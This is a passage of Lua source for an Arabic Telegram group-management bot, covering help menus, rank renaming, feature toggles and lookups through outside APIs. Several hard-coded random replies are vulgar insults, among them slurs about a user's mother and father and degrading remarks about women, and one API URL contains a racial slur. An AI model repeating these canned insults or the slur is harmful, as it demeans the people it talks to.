local Teext = text:match("^غير اسم منشئ الاساسي (.*)$") 
database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المنشئ الاساسي الى > "..Teext)
end
if text and text:match("^غير اسم المنشئ (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم المنشئ (.*)$") 
database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المنشئ الى > "..Teext)
end
if text and text:match("^غير اسم المدير (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم المدير (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المدير الى > "..Teext)
end
if text and text:match("^غير اسم الادمن (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم الادمن (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم الادمن الى > "..Teext)
end
if text and text:match("^غير اسم المميز (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم المميز (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المميز الى > "..Teext)
end
if text and text:match("^غير اسم ﭑݪعضوٍَ (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم ﭑݪعضوٍَ (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم ﭑݪعضوٍَ الى > "..Teext)
end
if text == 'م1' or text == 'م2' or text == 'م3' or text == 'م4' or text == 'م5' then
send(msg.chat_id_, msg.id_,"صـاࢪت قديـمه مال م ثقـفنه اكـتب الاوامࢪ..🕸️")
return false
end
if text == 'الاوامر' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' ⊀︰ هاذا الامر خاص بالادمنيه\n ⊀︰ ارسل {م10} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Text =[[
𝖶𝖾𝖫𝖢𝗈𝖬𝖾 𝗍𝖮 𝖱𝗂𝖭𝖣𝖺 𝗅𝖭𝖿𝖮 ↴
*- مَ1 ↫ اوامࢪ سـد 𝖺𝖭𝖽 افتح*
*- مَ2 ↫ اوامࢪ تعطيـل 𝖺𝖭𝖽 تفعـيل*
*- مَ3 ↫ اوامࢪ خلـي 𝖺𝖭𝖽 اضف*
*- مَ4 ↫ اوامࢪ مسـح 𝖺𝖭𝖽 حـذف*
*- مَ5 ↫ اوامࢪ نـزل 𝖺𝖭𝖽 ارفـع 𝖺𝖭𝖽 غيࢪ*
*- مَ6 ↫ اوامࢪ ترتيـب الڪروب *
*- مَ7 ↫ اوامࢪ التسلـيه *
*- مَ8 ↫ اوامࢪ المطوريـن *
*- مَ9 ↫ اوامـࢪ مطـور الاساسـي *
*- مَ10 ↫ اوامࢪ ﭑݪعضوَ *
●━━━━𝐑𝐀━━━━●
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----------------------------------------------------------------------------
if text == 'الاضافات' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⊀︰ هاذا الامر خاص بالادمنيه\n ⊀︰ ارسل {م10} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Text =[[
منـوࢪني يّأ وࢪدهِ
 تڪـدࢪ تعࢪف حاݪه الأّضافاتّ ↓
 بـس اڪتب ↫ حاله الاضافات
ـ━━━━𝐑𝐀━━━━
تڪدࢪ تــنتقل بلاضافات.. ↓
بلسـته الموجوده بـضغـط 
ـ━━━━𝐑𝐀━━━━
●━━━━𝐑𝐀━━━━●
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----------------------------------------------------------------- انتهئ الاوامر الجديدة
if text == "تعطيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل الزخرفه*')
database:set(bot_id.." mode:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'*⊀︰ تم تفعيل الزخرفه*')
database:set(bot_id.." mode:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." mode:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n⊀︰ قائمه الزخرفه \n●━━━━𝐑𝐀━━━━●\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'●━━━━𝐑𝐀━━━━●ٴ\n⊀︰ ⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA) ')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل الابراج*')
database:set(bot_id.." mode:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'*⊀︰ تم تفعيل الابراج*')
database:set(bot_id.." mode:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." mode:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://mode-dev.tk/Api2/Modbr.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل حساب العمر*')
database:set(bot_id.." mode:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل حساب العمر*')
database:set(bot_id.." mode:age_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_,'*⊀︰ تم تفعيل حساب العمر*')
database:set(bot_id.." mode:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." mode:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://mode-dev.tk/Api1/niggaapi.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل الافلام*')
database:set(bot_id.."mode:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'*⊀︰ تم تفعيل الافلام*')
database:set(bot_id.."mode:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."mode:movie_bot"..msg.chat_id_) == "open" then
local Textm = text:match("^فلم (.*)$")
data,res = https.request('https://forhassan.ml/Black/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
getmo = json:decode(data)
if getmo.Info == true then
local Text ='قصه الفلم'..getmo.info
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web},{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" or text == "شنو رئيج بهذ" or text == "شنو رئيج بهذا" or text == "شنو رايك بهذا" or text == "شنو رايك بهذ" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ملطـلط داخـل للتلي علـمود بنـات..🔫 "," احـسه موخـوش ولـد..🍫","ملطـلط بنـات.🐍"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" or text == "شنو رئيج بهايي" or text == "شنو رئيج بهاي" or text == "شنو رايك بهاي" or text == "شنو رايك بهايي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"عـود ثكيلۿ وهيـه منجوه لجـوه وكول مڪال وائل..🦇","تحـط صوࢪ مو الـها وتصيـح اني بنيـه زࢪبا..🔫","احـسها موخـوش بنيه وعتـقد مࢪتبطه الـف مࢪا..🍼"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" or text == "هيني" or text == "رزلي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"سـࢪسح قنفذ هوه انتـه جـلب ڪ...🔫","لـو بيك خيـࢪࢪ مضـل ملطلـط نسـوان..🦇","لـو بيك خيـࢪࢪ ماحصࢪك فلان..🔫🤣","امك ڪحبۿ وابـوك كواد شتطلـ؏ انتـه طبيب اسنـان..🍼"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" or text == "بوسه" or text == "بوسي" or text == "مصي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح🍫","ماحـب بوس ڪلـبي شوف وائل..🦇","خـدڪ وصـخ دي..🔫 😂","بـوسني بلاول.🦇","ويـن.؟ تࢪيـده بشفـتڪ؟","ابنـحلووو داڪلك عيـب..🕸️","عـيب وائل ميقبـل..🎀","مــحح منشـفه..🥤"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == 'تفعيل الردود' and Manager(msg) then   
database:del(bot_id..'lock:reply'..msg.chat_id_)  
Text = '* ⊀︰ تم تفعيل الردود*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' and Manager(msg) then  
database:set(bot_id..'lock:reply'..msg.chat_id_,true)  
Text = '\n *⊀︰ تـم تعطيـل الࢪدود🕸️*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'رابط الحذف' or text == 'رابط حذف' then
t =[[
⊀︰ . ࢪابـط الحـذف في جميـ؏ مواقـ؏ التواصـل
فكـر قبـل لا تتـسرع وتـروح
𝐋𝐈𝐍𝐊🦖
⊀︰ ------------𝐑𝐀------------⊀︰ 
 ⊀︰ . رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܁
 ⊀︰ . رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
 ⊀︰ . رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܁
 ⊀︰ . رابط حذف [Snspchat](https://accounts.RiNdAchat.com/accounts/login?continue=https%3A%2F%2Faccounts.RiNdAchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
if text and text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
------------------------------------------------------------------------
if text == "صلاحياتي" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
------------------------------------------------------------------------
if text and text:match('^صلاحياته @(.*)') then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"- المعرف غير صحيح \n*")   
return false  end   

Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg 
--------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
if Text == '/help1' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
. 𝖶𝖾𝖫𝖢𝗈𝖬𝖾 𝗍𝗈 𝖱𝗂𝖭𝖣𝖺 𝗈𝖱𝖽𝖤𝖱𝗌 .
 - ضݪع انته باوامࢪ م1 ↶ الحمـايه .
 ـ ( سـد ↶ افتح ) + الامرَ . 
●°↶ الروابـط
○°↶ المعـࢪف
●°↶ التـاك
○°↶ الشـاࢪحه
●°↶ التعـديل 
○°↶ التثـبيت
●°↶ المتحـࢪكه
○°↶ الملفـات
●°↶ الصـوࢪ
○°↶ التفلـيش
●°↶ الماࢪدكون
○°↶ البوتـات
●°↶ الابـاحي
○°↶ التكـࢪاࢪ
●°↶ الڪلايـش
○°↶ السيـلفي
●°↶ الملصـقات
○°↶ الفيـديو
●°↶ الانـلايـن
○°↶ الدردشـه
●°↶ التـويجـه
○°↶ الاغـاني
●°↶ الصـوت
○°↶ الجهـات
●°↶ الاشـعاࢪات
● ━━━━ 𝖱𝖠 ━━━━ ●
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help2' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🔏∫𝙾𝚁𝙳𝙴𝚁𝚂 - 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙸𝙾𝙽
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي 🔊 .
⊀︰ اوامر تفعيل وتعطيل ( ✗ - √) .
●━━━━𝐑𝐀━━━━●
⊀︰ تفعيل ~ تعطيل + امر 🔚 .
●━━━━𝐑𝐀━━━━●
⊀︰ اطردني
⊀︰ صيح
⊀︰ ضافني
⊀︰ الرابط 
⊀︰ الحظر
⊀︰ الارفع
⊀︰ الايدي
⊀︰ الالعاب
⊀︰ الحمايه القصوى
⊀︰ ردود المطور
⊀︰ ردود البوت
⊀︰ الترحيب
⊀︰ ردود المدير
⊀︰ ٴall
⊀︰ الردود
⊀︰ نسبة الحب
⊀︰ نسبة الرجوله
⊀︰ نسبه الانوثه 
⊀︰ نسبه الكره
⊀︰ حساب العمر
⊀︰ الابراج
⊀︰ تنبيه الاسماء
⊀︰ تنبيه المعرف
⊀︰ تنبيه الصور
⊀︰ التوحيد
⊀︰ الكتم الاسم
⊀︰ زخرفه
⊀︰ ردود البوت
⊀︰ اوامر التحشيش
⊀︰ صورتي 
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help3' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
📝∫𝙿𝚄𝚃 - 𝙰𝙳𝙳 .
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي ✓ .
⊀︰ اوامر الخلي - اضف ( 📌 - 📍) .
●━━━━𝐑𝐀━━━━●
⊀︰ اضف / حذف ← رد
⊀︰ اضف / حذف ← صلاحيه
●━━━━𝐑𝐀━━━━●
⊀︰ ضع + امر …
●━━━━𝐑𝐀━━━━●
⊀︰ اسم
⊀︰ رابط
⊀︰ ترحيب
⊀︰ قوانين
⊀︰ رد متعدد 
⊀︰ صوره
⊀︰ وصف
⊀︰ تكرار + عدد
⊀︰ رد
⊀︰ امر
⊀︰ ترتيب الاوامر
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help4' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
✂️∫W𝙸𝙿𝙴 - 𝙳𝙴𝙻𝙴𝚃𝙴 .
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي 🔊 .
⊀︰ اوامر مسح / الحذف ← امر ( ✂️ - 📝 ).
●━━━━𝐑𝐀━━━━●
⊀︰ مسح + امر ↓
●━━━━𝐑𝐀━━━━●
⊀︰ الايدي 
⊀︰ المميزين
⊀︰ الادمنيه
⊀︰ المدراء
⊀︰ المنشئين
⊀︰ الاساسين
⊀︰ الاسماء المكتومه
⊀︰ ردود المدير
⊀︰ البوتات
⊀︰ امسح
⊀︰ صلاحيه
⊀︰ قائمه منع المتحركات
⊀︰ قائمه منع الصور
⊀︰ قائمه منع الملصقات
⊀︰ مسح قائمه المنع
⊀︰ المحذوفين
●━━━━𝐑𝐀━━━━●
⊀︰ حذف  امر + الامر القديم
●━━━━𝐑𝐀━━━━●
⊀︰ الاوامر المضافه ( لعرض الاوامر المضافه ) 
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↻ 𝘽𝙖??𝙠 ↺', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help5' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🎚∫𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 - 𝚄𝙿𝙻𝙾𝙰𝙳 .
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي 🔊 .
⊀︰ اوامر نزل وارفع ( ⚖️ ) .
●━━━━𝐑𝐀━━━━●
⊀︰ نزل 🔛 ارفع + امر ↓
●━━━━𝐑𝐀━━━━●
⊀︰ مميز
⊀︰ ادمن
⊀︰ مدير
⊀︰ منشئ
⊀︰ منشئ اساسي
⊀︰ مالك
⊀︰ الادمنيه
⊀︰ ادمن بالكروب
⊀︰ ادمن بكل الصلاحيات
⊀︰ القيود 
⊀︰ نزل جميع الرتب
⊀︰ نزل الكل 
●━━━━𝐑𝐀━━━━●
⊀︰ اوامر التغير …
●━━━━𝐑𝐀━━━━●
⊀︰ غير اسم المطور + اسم
⊀︰ غير اسم المالك + اسم
⊀︰ غير اسم منشئ الاساسي + اسم
⊀︰ غير اسم المنشئ + اسم
⊀︰ غير اسم المدير + اسم
⊀︰ غير اسم الادمن + اسم
⊀︰ غير اسم المميز + اسم
⊀︰ غير اسم ﭑݪعضوٍَ + اسم
⊀︰ تغير امر الاوامر
⊀︰ تغير امر م1 ~ الئ م10
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help6' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🎫∫𝙶𝚁𝙾𝚄𝙿 𝙾𝚁𝙳𝙴𝚁𝚂 .
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي ✓ .
⊀︰ اوامر المجموعه 📢 .
●━━━━𝐑𝐀━━━━●
⊀︰ الاوامر كالتالي ♻️ ↓
●━━━━𝐑𝐀━━━━●
